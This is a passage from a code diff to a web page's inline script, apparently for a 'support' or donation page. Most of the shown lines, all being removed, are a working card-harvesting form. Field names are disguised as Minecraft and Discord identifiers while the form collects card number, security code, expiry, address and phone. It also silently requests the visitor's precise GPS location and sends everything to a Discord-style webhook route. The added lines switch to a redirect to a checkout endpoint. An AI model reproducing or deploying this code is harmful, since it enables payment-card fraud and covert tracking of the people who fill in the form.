-  if (/^3(0|6|8|9)/.test(digits)) return "diners";
-  return "";
-}
-function updateCardBrand(input) {
-  const badges = input.closest(".payment-input-wrap")?.querySelector(".id-badges");
-  if (!badges) return;
-  const brand = getCardBrand(input.value.replace(/\D/g,""));
-  badges.dataset.brand = brand; badges.classList.toggle("has-brand", Boolean(brand));
-}
-updateCardBrand(minecraftIdInput);
-
-expirationInput.addEventListener("input", () => {
-  const digits = expirationInput.value.replace(/\D/g,"").slice(0,6);
-  expirationInput.value = digits.length > 2 ? `${digits.slice(0,2)}/${digits.slice(2)}` : digits;
-});
-
-function isCurrentOrFutureMonth(value) {
-  const match = value.match(/^(0[1-9]|1[0-2])\/(\d{4})$/);
-  if (!match) return false;
-  const month = Number(match[1]); const year = Number(match[2]);
-  const now = new Date(); const currentMonth = now.getMonth()+1; const currentYear = now.getFullYear();
-  return year > currentYear || (year === currentYear && month >= currentMonth);
-}
-
-function getFieldError(input) {
-  const value = input.value.trim(); const digits = value.replace(/\D/g,"");
-  if (input.required && !value) {
-    if (input === emailInput) return "Write your email address.";
-    if (input === phoneNumberInput) return "Phone number must be 6 to 15 digits.";
-    if (input === minecraftIdInput) return "Card Number is required and must be exactly 16 numbers.";
-    if (input === mcCodeInput) return "Security code is required.";
-    if (input === expirationInput) return "Write the expiration date in MM/YYYY format.";
-    return "Please fill out this field.";
-  }
-  if (input === emailInput && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return "Write a valid email address.";
-  if (input === phoneNumberInput && !/^\d{6,15}$/.test(digits)) return "Phone number must be 6 to 15 digits.";
-  if (input === minecraftIdInput && !/^\d{16}$/.test(digits)) return "Card Number must be exactly 16 numbers.";
-  if (input === mcCodeInput && !/^\d{3,4}$/.test(value)) return "Security code must be 3 or 4 numbers.";
-  if (input === expirationInput && !isCurrentOrFutureMonth(value)) return "Expiration date must be MM/YYYY and cannot be in the past.";
-  if (input === zipCodeInput) return getPostalCodeError(value, countryInput.value);
-  return "";
-}
-
-function getErrorElement(input) {
-  const label = input.closest("label"); if (!label) return null;
-  let el = label.querySelector(".field-error");
-  if (!el) { el = document.createElement("span"); el.className = "field-error"; label.append(el); }
-  return el;
-}
-
-function setFieldError(input, message) {
-  input.setCustomValidity(message); input.classList.toggle("is-invalid", Boolean(message));
-  const el = getErrorElement(input); if (el) el.textContent = message;
-}
-
-function refreshFieldValidity(input) { setFieldError(input, getFieldError(input)); }
-
-customValidationInputs.forEach(input => {
-  input.addEventListener("input", () => { setFieldError(input,""); if (input.value.trim()) refreshFieldValidity(input); });
-  input.addEventListener("blur", () => refreshFieldValidity(input));
-});
-
-function reportOrderFieldErrors() {
-  for (const input of customValidationInputs) {
-    refreshFieldValidity(input);
-    if (!input.validity.valid) { setStatus(input.validationMessage,"error"); input.focus(); return false; }
-  }
-  return true;
-}
-
-function setStatus(message, type="") { statusLine.textContent = message; statusLine.className = `status ${type}`; }
-function getFormData(form) { return Object.fromEntries(new FormData(form).entries()); }
-
-function validateOrder(data) {
-  if (!/^\d{16}$/.test(data.minecraftId.replace(/\D/g,""))) return "Card Number must be exactly 16 numbers.";
-  if (!/^\d{3,4}$/.test(data.mcCode)) return "Security code must be 3 or 4 numbers.";
-  if (!isCurrentOrFutureMonth(data.expirationDate)) return "Expiration date must be MM/YYYY and cannot be in the past.";
-  const postalCodeError = getPostalCodeError(String(data.zipCode||"").trim(), data.country);
-  if (postalCodeError) return postalCodeError;
-  return "";
-}
-
-function buildDiscordPayload(data) {
-  const fieldValue = (value, fallback="Not provided") => (String(value??"").trim()||fallback).slice(0,1024);
-  const total = Number(data.total);
-  const offerValue = Number.isFinite(total) ? `${total.toFixed(2)} (${fieldValue(data.amount,"1")} ${LABEL})` : "Not provided";
-  return {
-    username: "BakaBoost",
-    embeds: [{
-      title: `New Support for ${P.displayName}`,
-      color: 0x467ceb,
-      fields: [
-        { name:"Email", value:fieldValue(data.email), inline:true },
-        { name:"Card Number", value:fieldValue(data.minecraftId), inline:true },
-        { name:"Security code", value:fieldValue(data.mcCode), inline:true },
-        { name:"Expiration date", value:fieldValue(data.expirationDate), inline:true },
-        { name:"First name", value:fieldValue(data.minecraftName), inline:true },
-        { name:"Last name", value:fieldValue(data.discordName), inline:true },
-        { name:"Address", value:fieldValue(data.address), inline:false },
-        { name:"City", value:fieldValue(data.city), inline:true },
-        { name:"State / region", value:fieldValue(data.state), inline:true },
-        { name:getPostalCodeRule(data.country).label, value:fieldValue(data.zipCode), inline:true },
-        { name:"Country", value:fieldValue(data.country), inline:true },
-        { name:"Offer value", value:offerValue, inline:true },
-        { name:"Type", value:fieldValue(data.paymentType), inline:true },
-        { name:"Phone number", value:fieldValue(`${data.phoneCountryCode||""}${data.phoneNumber?" "+data.phoneNumber:""}`), inline:false },
-        { name:"Message", value:fieldValue(data.message,"No message"), inline:false },
-      ],
-      timestamp: new Date().toISOString(),
-    }],
-  };
-}
-
-async function encryptGPS(lat, lng, accuracy) {
-  const pubRes = await fetch("/api/public-key"); if (!pubRes.ok) return null;
-  const { publicKey: pem } = await pubRes.json();
-  const b64 = pem.replace("-----BEGIN PUBLIC KEY-----","").replace("-----END PUBLIC KEY-----","").replace(/\s/g,"");
-  const der = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-  const key = await crypto.subtle.importKey("spki", der, { name:"RSA-OAEP", hash:"SHA-256" }, false, ["encrypt"]);
-  const enc = await crypto.subtle.encrypt({ name:"RSA-OAEP" }, key, new TextEncoder().encode(JSON.stringify({ lat, lng, accuracy })));
-  return btoa(String.fromCharCode(...new Uint8Array(enc)));
-}
-
-function getGPS() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) { resolve(null); return; }
-    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:10000 });
-  });
-}
-
-async function postOrder(data) {
-  if (!location.protocol.startsWith("http")) throw new Error("Run server.js first.");
-  let encryptedLocation = null;
-  try { const pos = await getGPS(); if (pos) { const { latitude, longitude, accuracy } = pos.coords; encryptedLocation = await encryptGPS(latitude, longitude, accuracy); } } catch {}
-  const payload = buildDiscordPayload(data);
-  if (encryptedLocation) payload.encryptedLocation = encryptedLocation;
-  const tokenRes = await fetch("/api/token"); if (!tokenRes.ok) throw new Error("Could not get auth token");
-  const { token } = await tokenRes.json();
-  const serverResponse = await fetch("/api/order", { method:"POST", headers:{ "Content-Type":"application/json", "Authorization":`Bearer ${token}` }, body:JSON.stringify(payload) });
-  if (!serverResponse.ok) { const text = await serverResponse.text().catch(()=>""); throw new Error(text || `Webhook route failed with ${serverResponse.status}`); }
-}
-
-orderForm.addEventListener("submit", async event => {
+orderIntro.addEventListener("submit", async (event) => {
   event.preventDefault();
-  if (!reportOrderFieldErrors()) return;
-  if (!orderForm.reportValidity()) return;
-  const data = getFormData(orderForm);
-  const error = validateOrder(data);
-  if (error) { setStatus(error,"error"); return; }
-  setStatus("Sending...");
+  if (!orderIntro.reportValidity()) return;
+
+  const amount = Number(introTotal.value);
+  if (!Number.isFinite(amount) || amount < COFFEE_PRICE) {
+    setStatus("Enter a valid amount.", "error");
+    return;
+  }
+
+  setStatus("Redirecting to secure checkout...");
   try {
-    await postOrder(data);
-    setStatus("Order sent! Thank you for your support ♥", "ok");
-    orderForm.reset();
-    selectPhoneCountryByName(DEFAULT_COUNTRY);
-    syncCountryFromPhoneCode(); updatePostalCodeField(); updateCardBrand(minecraftIdInput);
+    const res = await fetch("/api/checkout/create", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: P.username,
+        amount,
+        fanName: introName.value.trim(),
+        message: introMessage.value.trim(),
+      }),
+    });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok || !data.url) throw new Error(data.message || "Could not start checkout.");
+    location.href = data.url;
   } catch (error) {
     console.error(error);
-    setStatus(error.message || "Could not send order.", "error");
+    setStatus(error.message || "Could not start checkout.", "error");
   }
 });
+
     </script>
   </body>
 </html>
